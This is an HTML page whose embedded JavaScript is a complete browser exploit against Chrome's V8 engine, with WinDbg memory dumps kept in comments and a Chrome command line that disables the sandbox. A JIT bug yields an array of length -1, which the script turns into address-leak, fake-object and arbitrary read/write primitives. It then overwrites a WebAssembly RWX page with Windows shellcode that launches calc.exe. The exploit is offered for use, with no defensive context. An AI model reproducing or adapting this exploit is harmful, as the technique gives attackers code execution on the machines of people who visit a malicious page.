<div id="log"></div>
<script>
function main() {
    var bs = new ArrayBuffer(8);
    var fs = new Float64Array(bs);
    var is = new BigUint64Array(bs);
    var us = new Uint32Array(bs);
    
    function log(_string) {
        console.log(_string);
        document.getElementById("log").innerHTML += `<p>${_string}</p>`;
    }
    
    function ftoi(val) {
        fs[0] = val;
        return is[0];
    }
    
    function myftoi(val) {
        fs[0] = val;
        return [us[0], us[1]];
    }
    
    function myitof(lower, upper) {
        us[0] = lower;
        us[1] = upper;
        return fs[0];
    }
    
    function itof(val) {
        is[0] = val;
        return fs[0];
    }
    
    function hex(_val) {
        return "0x"+_val.toString(16)
    }
    
    function foo(x) {
        let y = 0x7fffffff;
        if (x == NaN) y = NaN;
        if (x) y = -1;
        let z = y + 1;
        z >>= 31;
        z = Math.sign(z | 1);
        z = 0x7fffffff + 1 - z;
        let i = x ? 0 : z;
        i = 0 - Math.sign(i);
        let a = new Array(i);
        a.shift();
        let b = [1.1, 2.2, 3.3];
        return [a, b];
    }
    
    for (let i = 0; i < 100000; i++) foo(true);
    let [minus_1_arr, oob] = foo(false);
    log("[*] Created 2 arrays: 1 array of length -1 and 1 array of length 3")
    log("[*] The array of length 3 is the oob array which is not corrupted yet")
    log("[*] We will use the -1 length array to corrupt the oob array")
    function addrOf(k) {
        minus_1_arr[7] = k;
        return ftoi(oob[0]) & 0xffffffffn;
    }    
    function fakeObj(k) { // needs a full pointer cause this version of chrome does not use compressed pointer
        oob[0] = itof(k);
        return minus_1_arr[7];
    }

    minus_1_arr[13] = 200; // changes
    log("[*] Increasing the length of the oob array to 100 get oob r/w");
    log(`[*] Sanity check: OOB array length: ${oob.length}`);
    for (let i = 0; i < 20; i++) {
        if (1===2) log(i + " - " + hex(ftoi(oob[i])));
    }
    
/*
0:013> dq 0x0d4e18dafde1-1
00000d4e`18dafde0  00000c4d`d6e96701 000071fe`ef402cf1
00000d4e`18dafdf0  00000d4e`18dafdb9 000000c8`00000000
00000d4e`18dafe00  000071fe`ef402881 00000002`00000000
00000d4e`18dafe10  00000d4e`18dafd99 00000d4e`18dafde1
00000d4e`18dafe20  00000c4d`d6e967a1 000071fe`ef402cf1
00000d4e`18dafe30  00000d4e`18dafe01 00000002`00000000
00000d4e`18dafe40  00000c4d`d6e985a1 000071fe`ef402cf1
00000d4e`18dafe50  000071fe`ef402cf1 00000d4e`18dafe21
0:013> dq 000071fe`ef402cf1-1
000071fe`ef402cf0  000071fe`ef402881 00000000`00000000
000071fe`ef402d00  000071fe`ef402d31 c0100000`00000000
000071fe`ef402d10  000071fe`ef402d81 fffffffc`00000000
000071fe`ef402d20  000071fe`ef402581 00000004`00000000
000071fe`ef402d30  000071fe`ef402251 19000083`1b000006
000071fe`ef402d40  00000000`082003ff 000071fe`ef4022a1
000071fe`ef402d50  000071fe`ef4022a1 00000000`00000000
000071fe`ef402d60  000071fe`ef402321 00000000`00000000
0 - 0x3ff199999999999a
1 - 0x400199999999999a
2 - 0x400a666666666666
3 - 0xc4dd6e96701  // map
4 - 0x71feef402cf1 // properties
0x0d4e18dafde1 <JSArray[200]>
*/
/*
0:013> dq 0x75e515562151-1
000075e5`15562150  000060af`2bbb6731 00000040`a5202cf1
000075e5`15562160  000075e5`15562181 00000004`00000000
000075e5`15562170  00000040`a5206fe9 0000424c`ceb71349
000075e5`15562180  00000040`a5203529 00000004`00000000
000075e5`15562190  000060af`2bbb6731 40113333`33333333
000075e5`155621a0  40119999`9999999a 40120000`00000000
000075e5`155621b0  00000040`a5202631 000060af`2bbb6731
000075e5`155621c0  00000040`a5202631 000075e5`15562151
*/

    let randoFullPointer = oob[9];
    let top = myftoi(randoFullPointer)[1]

    let test = [oob[3],oob[4],4.4,myitof(0x0, 0x41)]; // since we dont use compressed pointers in this version of chrome, index 2 is where the element pointer is at
    let test_addr_number = addrOf(test);
    //%DebugPrint(test);
    let full_test_addr_number = ftoi(myitof(Number(test_addr_number),Number(top)));
    //log(hex(full_test_addr_number));
    let fake = fakeObj(full_test_addr_number+0x40n);
    //%DebugPrint(fake);

    function arb_read(_address) {
        test[2] = itof(_address-0x10n); // since we dont use compressed pointers in this version of chrome, offset is 0x10
        return ftoi(fake[0]);
    }

    function arb_writ(_address, _value) {
        test[2] = itof(_address-0x10n); // since we dont use compressed pointers in this version of chrome, offset is 0x10
        fake[0] = itof(_value);
    }

/*
725c`fd8f0000     725c`fd900000        0`00010000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  
*/

    let ab = new ArrayBuffer(0x1024);
    let abu8 = new Uint8Array(ab);
    let ab32 = new Uint32Array(ab);
    ab32[0] = 0x41414141;
    let calc_shellcode = new Uint8Array(
        [   0x90,
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
            0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
            0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
            0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
            0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
            0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
            0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
            0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
            0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
            0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
            0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
            0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
            0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
            0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
            0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
            0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
            0x65, 0x78, 0x65, 0x00, 0x90, 0x90, 0x90, 0x90
        ]
    );
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;

    eval(`%DebugPrint(${wasmModule});`);
    eval(`%DebugPrint(${wasmInstance});`);
    eval(`%DebugPrint(${ab});`);

    var wasmModuleAddr = addrOf(wasmModule); 
    var wasmModuleAddr_full = ftoi(myitof(Number(wasmModuleAddr),Number(top)));
    var wasmInstance_top = myftoi(itof(arb_read(wasmModuleAddr_full+0x20n)))[1];
    var wasmInstance_btm = addrOf(wasmInstance); 
    var wasmInstanceAddr = ftoi(myitof(Number(wasmInstance_btm), Number(wasmInstance_top)));
    log("[+] wasmInstance: " + hex(wasmInstanceAddr));
    var rwx = arb_read(wasmInstanceAddr+0xf0n)
    log("[+] RWX: " + hex(rwx));

    var ab_address = ftoi(myitof(Number(addrOf(ab)),Number(top)));
    log("[+] Location where my shellcode be at: " + hex(ab_address));
    arb_writ(ab_address+0x20n, rwx+0x0n);
    arb_writ(ab_address+0xa0n, rwx+0x0n);
    abu8.set(calc_shellcode);
    func();
}
main()
</script>
<h1>"C:\Users\kali\AppData\Local\Google\Chrome\Application\chrome.exe" --no-sandbox --js-flags="--allow-natives-syntax" --enable-logging --v=1</h1>